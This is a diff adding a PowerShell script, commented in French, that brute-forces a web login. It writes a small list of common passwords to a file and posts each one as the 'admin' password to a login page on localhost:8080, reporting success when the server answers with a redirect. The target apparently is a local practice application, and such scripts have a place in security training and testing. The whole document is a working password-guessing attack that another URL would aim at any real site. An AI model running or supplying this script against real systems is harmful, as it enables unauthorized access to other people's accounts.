@@ -1,0 +1,24 @@
+# Créer un petit fichier de test
+@"
+password
+admin
+123456
+admin123
+root
+toor
+letmein
+"@ | Out-File -FilePath test_passwords.txt -Encoding UTF8
+
+# Lire et tester
+$passwords = Get-Content test_passwords.txt
+$url = "http://localhost:8080/login.php"
+
+foreach ($pass in $passwords) {
+    Write-Host "Testing: admin / $pass" -ForegroundColor Yellow
+    $result = Invoke-WebRequest -Uri $url -Method POST -Body "username=admin&password=$pass&Login=Login" -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue
+    
+    if ($result.StatusCode -eq 302) {
+        Write-Host "SUCCESS! Password is: $pass" -ForegroundColor Green
+        break
+    }
+}
